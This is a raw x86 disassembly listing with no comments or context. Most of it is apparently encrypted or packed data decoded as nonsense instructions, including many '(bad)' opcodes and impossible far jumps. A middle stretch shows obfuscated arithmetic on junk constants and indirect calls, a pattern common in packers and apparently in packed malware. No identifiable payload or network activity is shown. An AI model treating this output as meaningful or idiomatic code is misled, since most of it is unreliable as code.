  417552:	int    0x69
  417554:	lods   al,BYTE PTR ds:[esi]
  417555:	js     0x41752b
  417557:	jmp    0xc12c:0x8ea9fb7f
  41755e:	jo     0x417590
  417560:	pop    es
  417561:	mov    esi,0xd2f603f3
  417566:	push   esp
  417567:	xor    eax,0x9e79f810
  41756c:	xor    DWORD PTR [ebx],edx
  41756e:	loopne 0x417597
  417570:	cmp    al,BYTE PTR [ebx+0x79]
  417573:	jns    0x417540
  417575:	adc    cl,BYTE PTR [ebx+0x37]
  417578:	in     al,dx
  417579:	sbb    eax,0x9ca0e8bd
  41757e:	mov    ds:0xc7000ff7,eax
  417583:	popf   
  417584:	dec    edx
  417585:	mov    esp,0x58a7f99a
  41758a:	test   BYTE PTR [ecx],bl
  41758c:	add    DWORD PTR [ebx-0x128ede76],0xcf0944f0
  417596:	adc    esp,ebp
  417598:	popa   
  417599:	ret    0x3699
  41759c:	xchg   ebx,eax
  41759d:	xlat   BYTE PTR ds:[ebx]
  41759e:	mov    es,WORD PTR [ebx-0x40c263f1]
  4175a4:	scas   al,BYTE PTR es:[edi]
  4175a5:	add    bl,al
  4175a7:	or     al,0x46
  4175a9:	adc    BYTE PTR [ecx+0x37],al
  4175ac:	daa    
  4175ad:	stos   BYTE PTR es:[edi],al
  4175ae:	and    BYTE PTR ds:0xcbd8c306,bh
  4175b4:	adc    cl,BYTE PTR [ebx-0x3ac4e9c7]
  4175ba:	addr16 xchg ebx,eax
  4175bc:	cmp    ah,BYTE PTR [ebx-0x5732136b]
  4175c2:	retf   
  4175c3:	cmp    esi,esi
  4175c5:	sti    
  4175c6:	pop    esi
  4175c7:	mov    bl,0x8e
  4175c9:	mov    bh,0x7d
  4175cb:	sbb    eax,0x6e3c4f3a
  4175d0:	popf   
  4175d1:	or     ebp,DWORD PTR [eax-0x12]
  4175d4:	inc    edi
  4175d5:	int    0xf2
  4175d7:	fiadd  DWORD PTR [ebx+0x57f3bf04]
  4175dd:	pop    edx
  4175de:	dec    eax
  4175df:	sub    bh,BYTE PTR [edx-0x5d]
  4175e2:	nop
  4175e3:	pop    esi
  4175e4:	daa    
  4175e5:	outs   dx,BYTE PTR ds:[esi]
  4175e6:	xlat   BYTE PTR ds:[ebx]
  4175e7:	pop    ss
  4175e8:	jecxz  0x4175b9
  4175ea:	sbb    BYTE PTR [esi-0x60],0xeb
  4175ee:	in     eax,0xfe
  4175f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4175f1:	stos   BYTE PTR es:[edi],al
  4175f2:	test   dh,cl
  4175f4:	sub    DWORD PTR [ebx],ebx
  4175f6:	(bad)  
  4175f7:	call   FWORD PTR [edx+0x66]
  4175fa:	sub    ebx,eax
  4175fc:	shr    esp,0x67
  4175ff:	mov    al,BYTE PTR [eax+0x403c4863]
  417605:	push   es
  417606:	push   ss
  417607:	das    
  417608:	clc    
  417609:	fiadd  WORD PTR [edi-0x5c1adee6]
  41760f:	nop
  417610:	mov    bh,0xf0
  417612:	stos   DWORD PTR es:[edi],eax
  417613:	and    eax,0xe58e60d7
  417618:	imul   edx,DWORD PTR [ecx-0x73],0x40b5848e
  41761f:	cwde   
  417620:	cmp    eax,0x47bffcfd
  417625:	sub    esi,DWORD PTR [edx+edi*1-0x52]
  417629:	call   0xa2ba12f2
  41762e:	xchg   ecx,eax
  41762f:	shl    DWORD PTR [edx+esi*8-0x6],0xa7
  417634:	inc    edx
  417635:	mov    eax,ds:0xde4d59bd
  41763a:	jmp    0xbfa1:0x1b1f2266
  417641:	test   al,0x22
  417643:	add    ch,ch
  417645:	lahf   
  417646:	mov    esp,0x233f899e
  41764b:	sub    esp,ebx
  41764d:	xor    bl,bh
  41764f:	dec    edi
  417650:	adc    BYTE PTR [edi+0x29],cl
  417653:	xor    al,BYTE PTR [ecx-0x11533741]
  417659:	js     0x4176c1
  41765b:	ins    BYTE PTR es:[edi],dx
  41765c:	iret   
  41765d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41765e:	fadd   QWORD PTR [ecx+eiz*2+0x6b31084d]
  417665:	pop    es
  417666:	mov    al,0xe7
  417668:	and    DWORD PTR [ecx-0x769963fb],esi
  41766e:	aas    
  41766f:	xor    BYTE PTR [eax],dh
  417671:	hlt    
  417672:	inc    esi
  417673:	sti    
  417674:	imul   ecx,edx,0x9c3a625f
  41767a:	fld    TBYTE PTR [eax-0x2bce502d]
  417680:	jb     0x41765f
  417682:	rol    DWORD PTR [edx],cl
  417684:	sti    
  417685:	div    DWORD PTR [esi+0xab444aa]
  41768b:	add    dl,BYTE PTR [ebx]
  41768d:	push   esp
  41768e:	dec    esi
  41768f:	fsubp  st(5),st
  417691:	fstp   QWORD PTR [edx]
  417693:	push   esi
  417694:	sbb    ax,0x44de
  417698:	fnsetpm(287 only) 
  41769a:	push   0x50
  41769c:	mov    edx,0xb47b98b2
  4176a1:	pop    edi
  4176a2:	xchg   esi,eax
  4176a3:	jp     0x41767e
  4176a5:	test   DWORD PTR [ecx],esi
  4176a7:	dec    edx
  4176a8:	ja     0x417724
  4176aa:	retf   0xa385
  4176ad:	(bad)  
  4176ae:	xlat   BYTE PTR ds:[ebx]
  4176af:	bound  esi,QWORD PTR [ebx+0x5d]
  4176b2:	push   es
  4176b3:	(bad)  
  4176b4:	pop    ebx
  4176b5:	in     eax,dx
  4176b6:	and    BYTE PTR [edx-0x5e731d98],ch
  4176bc:	data16 adc ah,BYTE PTR [edi-0x3e597cce]
  4176c3:	lds    esi,FWORD PTR [ebx+0x26]
  4176c6:	and    ecx,DWORD PTR [esi+0x38d4c8ab]
  4176cc:	(bad)  
  4176cd:	and    BYTE PTR [eax],bl
  4176cf:	popf   
  4176d0:	push   cs
  4176d1:	or     bl,BYTE PTR [ebx]
  4176d3:	dec    ebp
  4176d4:	sub    cl,BYTE PTR [edi]
  4176d6:	xchg   BYTE PTR [ebx],bl
  4176d8:	not    DWORD PTR [edi]
  4176da:	mov    ebx,0xc8c67f2
  4176df:	(bad)  
  4176e0:	out    dx,al
  4176e1:	mov    edi,0x599064f1
  4176e6:	not    DWORD PTR [ebx-0x80]
  4176e9:	xchg   ebx,eax
  4176ea:	push   es
  4176eb:	mov    ecx,DWORD PTR [eax+esi*2]
  4176ee:	popf   
  4176ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4176f0:	sbb    BYTE PTR [edi+0x304437cf],0x23
  4176f7:	enter  0x8783,0x4f
  4176fb:	and    DWORD PTR [edx+0x27],eax
  4176fe:	mov    eax,0xca36b5cd
  417703:	mov    cl,0x26
  417705:	stos   DWORD PTR es:[edi],eax
  417706:	shl    BYTE PTR [esi],0x81
  417709:	jns    0x4176d3
  41770b:	adc    ebx,DWORD PTR [eax]
  41770d:	mov    dh,0xdd
  41770f:	test   BYTE PTR [ecx],ch
  417711:	cmp    ecx,ecx
  417713:	sbb    DWORD PTR [ebx],edi
  417715:	rol    DWORD PTR [eax+0xb],1
  417718:	cmp    bl,bh
  41771a:	push   ss
  41771b:	inc    ebp
  41771c:	ficomp DWORD PTR [esi+0x2]
  41771f:	jmp    0x4730aa1b
  417724:	mov    edx,?
  417726:	mov    bl,0x7d
  417728:	mov    al,0x38
  41772a:	(bad)  
  41772b:	xchg   ebx,eax
  41772c:	mov    dh,0x63
  41772e:	cmp    bl,bl
  417730:	js     0x417701
  417732:	gs jmp 0x41773a
  417735:	sbb    al,bl
  417737:	jp     0x4176d6
  417739:	sub    ah,BYTE PTR [ebx+0xf16e720]
  41773f:	and    cl,BYTE PTR [edx-0x31]
  417742:	pop    ebx
  417743:	shr    DWORD PTR gs:[edi],0x3e
  417747:	pushf  
  417748:	scas   al,BYTE PTR es:[edi]
  417749:	push   ss
  41774a:	shr    bh,0xa8
  41774d:	pop    ebp
  41774e:	jb     0x417720
  417750:	jecxz  0x41777d
  417752:	imul   esi,DWORD PTR [ebp-0x74],0xffffffb3
  417756:	into   
  417757:	dec    eax
  417758:	adc    dl,BYTE PTR ds:0x7f436ece
  41775e:	xchg   edx,eax
  41775f:	fnstsw WORD PTR [ebx+edx*8+0x73]
  417763:	push   ebx
  417764:	shl    BYTE PTR [edi],1
  417766:	loope  0x417756
  417768:	stos   DWORD PTR es:[edi],eax
  417769:	inc    eax
  41776a:	pop    edx
  41776b:	push   eax
  41776c:	jmp    0xf96e2745
  417771:	test   eax,0x54ba7817
  417777:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417778:	push   eax
  417779:	das    
  41777a:	icebp  
  41777b:	push   cs
  41777c:	jae    0x4177b4
  41777e:	xor    eax,0xd88682e
  417783:	nop
  417784:	and    eax,DWORD PTR [eax]
  417786:	sub    eax,0x57a31087
  41778b:	and    eax,0x8f6d5d54
  417790:	les    eax,FWORD PTR [edx+0x7d170ece]
  417796:	ds fs mov ebx,0xc731eb52
  41779d:	mov    ds:0xa130f9b1,al
  4177a2:	outs   dx,BYTE PTR ds:[esi]
  4177a3:	aad    0xb7
  4177a5:	push   ss
  4177a6:	sbb    al,BYTE PTR [edi+eiz*1]
  4177a9:	xchg   esi,eax
  4177aa:	cwde   
  4177ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4177ac:	jl     0x4177f6
  4177ae:	push   esi
  4177af:	(bad)  
  4177b0:	mov    esp,0x4ae02b97
  4177b5:	xor    dl,BYTE PTR [ebx+0x1875c363]
  4177bb:	mov    ebx,0xb0d5f764
  4177c0:	xor    al,0x8e
  4177c2:	(bad)  
  4177c3:	pop    ds
  4177c4:	jge    0x417777
  4177c6:	ss mov bl,0x27
  4177c9:	ds inc esi
  4177cb:	ret    0x3ec9
  4177ce:	outs   dx,DWORD PTR ds:[esi]
  4177cf:	and    eax,0xe0c97c29
  4177d4:	pop    edx
  4177d5:	pop    DWORD PTR [ecx+ebp*1-0x65]
  4177d9:	adc    BYTE PTR [ecx-0x30bc8dae],dl
  4177df:	adc    DWORD PTR [edx],ecx
  4177e1:	pop    esi
  4177e2:	scas   eax,DWORD PTR es:[edi]
  4177e3:	fimul  WORD PTR [edx+esi*1+0x593afa3f]
  4177ea:	aam    0x18
  4177ec:	or     DWORD PTR [ebp-0x57],esp
  4177ef:	call   0x4f96:0x14ae81a4
  4177f6:	lods   al,BYTE PTR ds:[esi]
  4177f7:	retf   
  4177f8:	dec    edx
  4177f9:	shl    DWORD PTR [esi],0x51
  4177fc:	mov    ch,0x38
  4177fe:	push   ecx
  4177ff:	pop    esi
  417800:	xor    cl,BYTE PTR [edx+0x0]
  417803:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417804:	ror    DWORD PTR [eax-0x6ff5ddab],1
  41780a:	rcl    bl,cl
  41780c:	push   edi
  41780d:	in     eax,dx
  41780e:	push   ecx
  41780f:	(bad)  
  417810:	jns    0x417851
  417812:	(bad)  
  417813:	ins    BYTE PTR es:[edi],dx
  417814:	jmp    0x41780c
  417816:	xacquire xchg BYTE PTR [eax-0x21d57e92],ah
  41781d:	adc    al,0x74
  41781f:	jge    0x41788e
  417821:	pop    ecx
  417822:	shl    bl,1
  417824:	jmp    0x417881
  417826:	inc    esi
  417827:	pop    esp
  417828:	bound  ebp,QWORD PTR [esp+ebp*4-0x32]
  41782c:	and    esp,DWORD PTR [ecx*4+0x3823c0]
  417833:	ja     0x417817
  417835:	jle    0x4177ca
  417837:	fnstcw WORD PTR [edx]
  417839:	dec    esi
  41783a:	lds    esi,FWORD PTR [eax+ebx*8]
  41783d:	sbb    dh,BYTE PTR [edx-0x1570da3f]
  417843:	push   esi
  417844:	xor    ecx,ebp
  417846:	mov    dh,0xb9
  417848:	inc    esp
  417849:	pusha  
  41784a:	ja     0x417878
  41784c:	xchg   esi,eax
  41784d:	sti    
  41784e:	hlt    
  41784f:	dec    edx
  417850:	retf   
  417851:	add    eax,0x66a6159
  417856:	cmp    BYTE PTR [ecx+0x31c4b32e],bh
  41785c:	(bad)  
  41785d:	test   DWORD PTR [ebx],0x781b6f16
  417863:	or     BYTE PTR [eax],bh
  417865:	mov    edx,0x339b68ee
  41786a:	je     0x41781a
  41786c:	jb     0x4177fe
  41786e:	repz mov al,0x6
  417871:	test   eax,0x73893882
  417876:	mov    WORD PTR [ecx-0x13afef9d],gs
  41787c:	add    eax,0xa6af7426
  417881:	test   al,0x54
  417883:	stos   BYTE PTR es:[edi],al
  417884:	aaa    
  417885:	inc    ebp
  417886:	add    eax,0xf13aafac
  41788b:	aas    
  41788c:	jg     0x4178d7
  41788e:	jp     0x4178d9
  417890:	dec    esp
  417891:	push   0x229cf4ae
  417896:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417898:	push   ebx
  417899:	cs inc eax
  41789b:	mul    al
  41789d:	xchg   ah,dl
  41789f:	pop    eax
  4178a0:	and    bl,BYTE PTR [eax+0x65]
  4178a3:	cmp    edi,DWORD PTR [esi]
  4178a5:	stos   DWORD PTR es:[edi],eax
  4178a6:	test   bl,bl
  4178a8:	jp     0x41786e
  4178aa:	jns    0x417892
  4178ac:	js     0x41786c
  4178ae:	and    bh,BYTE PTR [edi+0x5e]
  4178b1:	sub    al,0xdd
  4178b3:	mov    DWORD PTR [edx-0x39],edx
  4178b6:	int    0x18
  4178b8:	pop    edi
  4178b9:	cs lahf 
  4178bb:	sbb    eax,0x24f89f45
  4178c0:	mov    esi,0xbf9e2526
  4178c5:	xchg   BYTE PTR [esi+0x7d],ch
  4178c8:	int    0x8d
  4178ca:	aad    0x8b
  4178cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4178cd:	xchg   esp,eax
  4178ce:	stos   DWORD PTR es:[edi],eax
  4178cf:	xor    al,0x85
  4178d1:	das    
  4178d2:	inc    ecx
  4178d3:	push   ebp
  4178d4:	cli    
  4178d5:	push   ebx
  4178d6:	xchg   ecx,eax
  4178d7:	inc    esi
  4178d8:	push   ss
  4178d9:	je     0x417943
  4178db:	fisub  WORD PTR [ecx-0x6c]
  4178de:	data16 shl BYTE PTR [ecx],cl
  4178e1:	imul   bl
  4178e3:	jns    0x4178de
  4178e5:	cmp    al,0x77
  4178e7:	cmp    dl,BYTE PTR [ebx+edx*1-0x26]
  4178eb:	fcomp  DWORD PTR [ebx]
  4178ed:	sti    
  4178ee:	push   0x0
  4178f0:	and    DWORD PTR ds:0x428277,0x6fb6
  4178fa:	push   DWORD PTR [ecx]
  4178fc:	or     DWORD PTR ds:0x428217,0x652f
  417906:	call   eax
  417908:	adc    esi,DWORD PTR ds:0x42822f
  41790e:	mov    esi,0x1ff
  417913:	add    eax,eax
  417915:	mov    DWORD PTR [esp+0x24],0x3992
  41791d:	mov    DWORD PTR [esp+0xc],0x79a2
  417925:	add    DWORD PTR ds:0x428217,0x3f4a
  41792f:	mov    eax,DWORD PTR [esp+0xc]
  417933:	mov    ecx,DWORD PTR ds:0x4282b7
  417939:	mov    ecx,DWORD PTR [ecx]
  41793b:	and    DWORD PTR ds:0x42827f,ecx
  417941:	mov    ecx,DWORD PTR [esp+0x24]
  417945:	sub    DWORD PTR ds:0x42822f,0x428237
  41794f:	xor    eax,0x1d22
  417954:	xor    DWORD PTR ds:0x4282f3,0x3de5
  41795e:	imul   eax,eax,0xffffdeb4
  417964:	and    eax,0x43eb
  417969:	sub    eax,ecx
  41796b:	xor    DWORD PTR ds:0x42824f,0x42817b
  417975:	mov    DWORD PTR [esp+0x3c],eax
  417979:	xor    DWORD PTR ds:0x42813b,0x24fe
  417983:	mov    DWORD PTR [esp+0x38],0x3b18
  41798b:	mov    DWORD PTR [esp+0x2c],0x6c93
  417993:	adc    DWORD PTR ds:0x42823f,0x3367
  41799d:	mov    DWORD PTR [esp+0x24],0x418e
  4179a5:	add    DWORD PTR ds:0x42827b,ebx
  4179ab:	mov    DWORD PTR [esp+0xc],0x5ac3
  4179b3:	xor    ecx,ecx
  4179b5:	add    ecx,DWORD PTR ds:0x428387
  4179bb:	add    DWORD PTR ds:0x42814b,ecx
  4179c1:	mov    eax,DWORD PTR [esp+0xc]
  4179c5:	mov    ecx,DWORD PTR [esp+0x24]
  4179c9:	add    DWORD PTR ds:0x428273,0x705
  4179d3:	sub    ecx,eax
  4179d5:	and    eax,0x1ffb
  4179da:	mov    eax,DWORD PTR [esp+0x2c]
  4179de:	and    ecx,eax
  4179e0:	mov    eax,DWORD PTR [esp+0x38]
  4179e4:	sbb    DWORD PTR ds:0x428133,0x42834f
  4179ee:	xor    ecx,0x10d6
  4179f4:	sub    ecx,0x782c
  4179fa:	imul   ecx,eax
  4179fd:	mov    eax,0x7fd0
  417a02:	mov    eax,DWORD PTR [esp+0x3c]
  417a06:	cmp    eax,ecx
  417a08:	mov    DWORD PTR ds:0x42814b,0x7353
  417a12:	jne    0x41890f
  417a18:	and    eax,eax
  417a1a:	mov    DWORD PTR [esp+0x10],0x1
  417a22:	mov    DWORD PTR [esp+0x30],0x2f16
  417a2a:	xor    ecx,DWORD PTR ds:0x428237
  417a30:	mov    DWORD PTR [esp+0x48],0x16f
  417a38:	mov    DWORD PTR [esp+0x50],0x30c5
  417a40:	add    DWORD PTR ds:0x4282d7,edx
  417a46:	push   DWORD PTR ds:0xe5bfd6f1
  417a4c:	cmp    DWORD PTR ds:0x428253,0x0
  417a53:	mov    DWORD PTR ds:0x4282cf,edx
  417a59:	mov    ecx,0x328
  417a5e:	mov    ecx,0x6d04
  417a63:	jmp    0x417abd
  417a68:	mov    DWORD PTR ds:0x428247,0x44f5
  417a72:	cmp    DWORD PTR ds:0x428253,0x0
  417a79:	je     0x417a9d
  417a7f:	push   DWORD PTR [ebp-0x18]
  417a82:	push   DWORD PTR [ebp-0x18]
  417a85:	push   0x8f00
  417a8a:	push   DWORD PTR [ebp-0x10]
  417a8d:	call   DWORD PTR ds:0x428dc4
  417a93:	not    ecx
  417a95:	sub    ecx,ecx
  417a97:	or     DWORD PTR ds:0x428227,ebx
  417a9d:	mov    ecx,DWORD PTR ds:0x4282b3
  417aa3:	mov    ecx,DWORD PTR [ecx]
  417aa5:	and    DWORD PTR ds:0x42816b,ecx
  417aab:	sbb    ecx,0x5390
  417ab1:	add    ecx,0xb3f
  417ab7:	add    DWORD PTR ds:0x42817b,edi
  417abd:	mov    DWORD PTR [esp+0x8c],0x4ebc
  417ac8:	xor    eax,eax
  417aca:	mov    DWORD PTR [esp+0x98],0x76
  417ad5:	mov    DWORD PTR [esp+0x40],0x556d
  417add:	neg    DWORD PTR ds:0x42813f
  417ae3:	jmp    0x417eb2
  417ae8:	(bad)  [eax-0x2]
  417aec:	xor    BYTE PTR [edx+0x1a],bh
  417aef:	fwait
  417af0:	clc    
  417af1:	dec    edi
  417af2:	arpl   WORD PTR [ebx+eiz*1-0x51439c54],di
  417af9:	loope  0x417b11
  417afb:	sbb    BYTE PTR [edx+edx*1-0x7466e7e8],bh
  417b02:	dec    ecx
  417b03:	(bad)  
  417b05:	(bad)  
  417b07:	addr16 pop ecx
  417b09:	jl     0x417b11
  417b0b:	(bad)  
  417b0c:	jnp    0x417b54
  417b0e:	ja     0x417b84
  417b10:	les    esi,FWORD PTR [eax-0x69b1ca1e]
  417b16:	leave  
  417b17:	fistp  DWORD PTR [ebx+0x55]
  417b1a:	stc    
  417b1b:	mov    WORD PTR [esi+0x7f],es
  417b1e:	push   ecx
  417b1f:	jg     0x417b51
  417b21:	loop   0x417b09
  417b23:	ficom  DWORD PTR [ebx-0xa]
  417b26:	sbb    al,0x5b
  417b28:	aad    0x62
  417b2a:	mov    esi,DWORD PTR [edi]
  417b2c:	xchg   ebp,eax
  417b2d:	mov    esp,0xfc1a71b4
  417b32:	sub    DWORD PTR [edx-0xcdba48c],0x42
  417b39:	js     0x417b8b
  417b3b:	gs (bad) 
  417b3d:	shl    DWORD PTR [edi-0x2625a74f],0xd6
  417b44:	(bad)  
  417b45:	repz in eax,0xf9
  417b48:	add    al,0xd0
  417b4a:	mov    al,ds:0x82801329
  417b4f:	stos   BYTE PTR es:[edi],al
  417b50:	cmp    al,dl
  417b52:	jne    0x417b2e
  417b54:	adc    ecx,ebp
  417b56:	repz out dx,al
  417b58:	popf   
  417b59:	mov    edi,0xef7d5270
  417b5e:	cdq    
  417b5f:	icebp  
  417b60:	shl    BYTE PTR [ecx+0x5a],0xd5
  417b64:	or     eax,0x92941c43
  417b69:	cwde   
  417b6a:	nop
  417b6b:	sub    ebx,DWORD PTR [ecx]
  417b6d:	stos   BYTE PTR es:[edi],al
  417b6e:	(bad)  
  417b6f:	aam    0x75
  417b71:	fnclex 
  417b73:	dec    esi
  417b74:	lods   al,BYTE PTR ds:[esi]
  417b75:	mov    edi,0xee606de4
  417b7a:	and    esi,DWORD PTR [edi-0x2b]
  417b7d:	fs aas 
  417b7f:	xchg   ebx,eax
  417b80:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417b81:	icebp  
  417b82:	(bad)  
  417b83:	dec    ebp
  417b84:	mov    esp,0xff673929
  417b89:	xor    DWORD PTR [ecx+0x1d],0x60de852b
  417b90:	or     BYTE PTR [ecx],bl
  417b92:	push   ebp
  417b93:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417b94:	bound  edi,QWORD PTR [edx]
  417b96:	xchg   edx,eax
  417b97:	pop    edx
  417b98:	nop
  417b99:	scas   eax,DWORD PTR es:[edi]
  417b9a:	cs scas eax,DWORD PTR es:[edi]
  417b9c:	cmp    al,0x2b
  417b9e:	push   0xffffffed
  417ba0:	mov    ah,0x28
  417ba2:	push   esi
  417ba3:	push   ebp
  417ba4:	jne    0x417b3a
  417ba6:	test   BYTE PTR [ecx+0xd],dh
  417ba9:	frstor [esi+0x11289a3]
  417baf:	jg     0x417c13
  417bb1:	jno    0x417bb1
  417bb3:	sbb    ah,BYTE PTR [ecx-0x7c3d5c3f]
  417bb9:	and    DWORD PTR [edi],edx
  417bbb:	xchg   DWORD PTR [ebx-0x1c],edx
  417bbe:	add    ebp,DWORD PTR [edi]
  417bc0:	out    0x56,al
  417bc2:	test   al,0xca
  417bc4:	push   esp
  417bc5:	ins    BYTE PTR es:[edi],dx
  417bc6:	call   0x455a:0x96bd4247
  417bcd:	jbe    0x417bf7
  417bcf:	dec    ecx
  417bd0:	(bad)  
  417bd1:	scas   al,BYTE PTR es:[edi]
  417bd2:	retf   0xdbe2
  417bd5:	test   DWORD PTR [edx],edx
  417bd7:	call   0x54af:0x9ef7c337
  417bde:	pop    edx
  417bdf:	enter  0x6868,0xd2
  417be3:	jmp    0xbec:0x7645163b
  417bea:	hlt    
  417beb:	mov    eax,ds:0x2e798fba
  417bf0:	rcr    DWORD PTR [edi-0x38],1
  417bf3:	pop    eax
  417bf4:	push   0xfffffff8
  417bf6:	test   DWORD PTR [ecx+0x58],ebp
  417bf9:	sbb    eax,0x98c76a7e
  417bfe:	pushf  
  417bff:	cmp    al,0x39
  417c01:	loopne 0x417c60
  417c03:	dec    edi
  417c04:	jnp    0x417bc1
  417c06:	or     ebp,esi
  417c08:	mov    cl,0x5e
  417c0a:	stc    
  417c0b:	xchg   ebp,eax
  417c0c:	rcl    BYTE PTR [esi-0x1f2abe3e],0xb8
  417c13:	es inc edi
  417c15:	cmp    eax,0xf2b9ba67
  417c1a:	inc    esp
  417c1b:	inc    edi
  417c1c:	sub    eax,0x11204e8d
  417c21:	push   0x52068b82
  417c26:	mov    WORD PTR [edx-0xe8025fc],fs
  417c2c:	push   es
  417c2d:	xor    eax,0xe43131f2
  417c32:	clc    
  417c33:	inc    ebx
  417c34:	aaa    
  417c35:	rol    DWORD PTR [ecx],0xd4
  417c38:	and    al,0x1
  417c3a:	xor    bh,0x7a
  417c3d:	rol    DWORD PTR [edi],cl
  417c3f:	out    0x1b,al
  417c41:	icebp  
  417c42:	mov    cl,0xd1
  417c44:	outs   dx,DWORD PTR ss:[esi]
  417c46:	mov    gs,WORD PTR cs:[esi-0x720dbf3]
  417c4d:	inc    esp
  417c4e:	and    DWORD PTR [eax+0x7c],ebp
  417c51:	xor    eax,0x45c2373c
  417c56:	push   ebx
  417c57:	pop    es
  417c58:	jbe    0x417be4
  417c5a:	ror    DWORD PTR [edx],0x31
  417c5d:	mov    edx,0x26bfbcf6
  417c62:	fisubr DWORD PTR [esi+0x5]
  417c65:	shr    BYTE PTR [ebp+0x48],0x8d
  417c69:	not    ebp
  417c6b:	push   esi
  417c6c:	jp     0x417cea
  417c6e:	pop    ss
  417c6f:	enter  0x48d1,0x28
  417c73:	loope  0x417bff
  417c75:	das    
  417c76:	xchg   ebp,eax
  417c77:	mov    esi,0xef7dcbd2
  417c7c:	sub    ah,dh
  417c7e:	fisttp QWORD PTR [ecx]
  417c80:	mov    ch,0xe8
  417c82:	dec    edx
  417c83:	sbb    BYTE PTR [eax+0x78ee1944],dh
  417c89:	scas   al,BYTE PTR es:[edi]
  417c8a:	fcom   QWORD PTR gs:[edi+0x5166cf92]
  417c91:	jmp    0x9f5e28b6
  417c96:	inc    edi
  417c97:	cmp    al,0x2d
  417c99:	dec    esp
  417c9a:	mov    gs,WORD PTR [ecx-0x29]
  417c9d:	jbe    0x417c7e
  417c9f:	(bad)  
  417ca0:	mov    ds:0x55e66390,eax
  417ca5:	adc    BYTE PTR [ebx+0x5e],al
  417ca8:	ret    
  417ca9:	mov    WORD PTR [esi],gs
  417cab:	push   es
  417cac:	ins    DWORD PTR es:[edi],dx
  417cad:	and    al,BYTE PTR [edx-0xd54b78f]
  417cb3:	push   ecx
  417cb4:	(bad)
  417cb8:	pop    esi
  417cb9:	pop    ss
  417cba:	xchg   edi,eax
  417cbb:	pop    ss
  417cbc:	inc    edx
  417cbd:	dec    ebx
  417cbe:	push   cs
  417cbf:	stos   BYTE PTR es:[edi],al
  417cc0:	pop    ds
  417cc1:	sbb    bl,bl
  417cc3:	fistp  DWORD PTR [edi+0x3da79c2f]
  417cc9:	xor    BYTE PTR [ebx],cl
  417ccb:	xlat   BYTE PTR ds:[ebx]
  417ccc:	mov    ch,0xb3
  417cce:	sar    edx,cl
  417cd0:	fisub  WORD PTR [ebx-0x3d]
  417cd3:	add    BYTE PTR [esp+ebx*4-0x35],0xc
  417cd8:	jnp    0x417c5e
  417cda:	push   ebp
  417cdb:	jl     0x417c6c
  417cdd:	inc    edx
  417cde:	frstor [esi]
  417ce0:	mov    DWORD PTR [eax-0x17ae0cf3],edi
  417ce6:	xchg   edi,eax
  417ce7:	push   eax
  417ce8:	loopne 0x417cdc
  417cea:	add    BYTE PTR [edi+0x2bf53b67],ah
  417cf0:	cld    
  417cf1:	pop    ebx
  417cf2:	enter  0x8602,0x4
  417cf6:	or     DWORD PTR [edi+0x53f19a89],esp
  417cfc:	cmp    edx,ecx
  417cfe:	popa   
  417cff:	mov    cl,0xf7
  417d01:	outs   dx,DWORD PTR ds:[esi]
  417d02:	or     DWORD PTR [esi+0x54],eax
  417d05:	(bad)  
  417d06:	out    dx,eax
  417d07:	mov    BYTE PTR [edx+0x77],dl
  417d0a:	lea    ecx,[eax]
  417d0c:	sti    
  417d0d:	loopne 0x417cff
  417d0f:	test   BYTE PTR [esi+0x5ad097a3],dl
  417d15:	add    BYTE PTR [esi-0x51558c51],al
  417d1b:	test   DWORD PTR [ecx-0x4d98d9fe],esi
  417d21:	pushf  
  417d22:	shr    esp,cl
  417d24:	add    al,0x46
  417d26:	hlt    
  417d27:	add    eax,0xba0c36d1
  417d2c:	scas   al,BYTE PTR es:[edi]
  417d2d:	hlt    
  417d2e:	cdq    
  417d2f:	and    DWORD PTR [ebx],eax
  417d31:	mov    ebp,DWORD PTR [edx-0x33b085b3]
  417d37:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417d38:	pop    esi
  417d39:	dec    esi
  417d3a:	adc    BYTE PTR [edi-0x11],al
  417d3d:	in     eax,0xf0
  417d3f:	out    dx,eax
  417d40:	ins    DWORD PTR es:[edi],dx
  417d41:	cmc    
  417d42:	sbb    DWORD PTR [ebx+0x7e96c662],edi
  417d48:	sub    eax,DWORD PTR [edx]
  417d4a:	dec    eax
  417d4b:	add    DWORD PTR [eax-0x4c3774e4],esi
  417d51:	sar    BYTE PTR [ebp-0x730f6b22],cl
  417d57:	jae    0x417d43
  417d59:	ins    BYTE PTR es:[edi],dx
  417d5a:	enter  0xb25b,0xd0
  417d5e:	stos   DWORD PTR es:[edi],eax
  417d5f:	sub    DWORD PTR [edi-0x57],0x2d
  417d63:	ins    BYTE PTR es:[edi],dx
  417d64:	push   ebx
  417d65:	test   DWORD PTR [edx-0x6a242069],0x98154668
  417d6f:	ds aam 0x54
  417d72:	fcomp  DWORD PTR [edx+eax*4-0x6d]
  417d76:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417d77:	sti    
  417d78:	iret   
  417d79:	dec    esi
  417d7a:	ja     0x417d09
  417d7c:	inc    ebx
  417d7d:	xor    ecx,esp
  417d7f:	push   esi
  417d80:	sub    BYTE PTR [ebx+0x45ae28cf],0xcf
  417d87:	adc    DWORD PTR [esi],esi
  417d89:	hlt    
  417d8a:	or     dl,ah
  417d8c:	inc    edx
  417d8d:	imul   ebp,DWORD PTR [edx+0x7184602e],0x1b7bf5b5
  417d97:	je     0x417e18
  417d99:	or     eax,0x8ce4e101
  417d9e:	push   ecx
  417d9f:	inc    edi
  417da0:	cmp    bh,al
  417da2:	arpl   WORD PTR [ecx],cx
  417da4:	xor    al,0xf3
  417da6:	pop    es
  417da7:	pop    eax
  417da8:	mov    ch,0x13
  417daa:	rcr    BYTE PTR [esi],1
  417dac:	aaa    
  417dad:	mov    BYTE PTR [esi-0x5e],dl
  417db0:	imul   DWORD PTR ds:0x24f6d4
  417db6:	mov    eax,ecx
  417db8:	std    
  417db9:	sub    ebp,DWORD PTR ds:0xc5d21ffb
  417dbf:	retf   
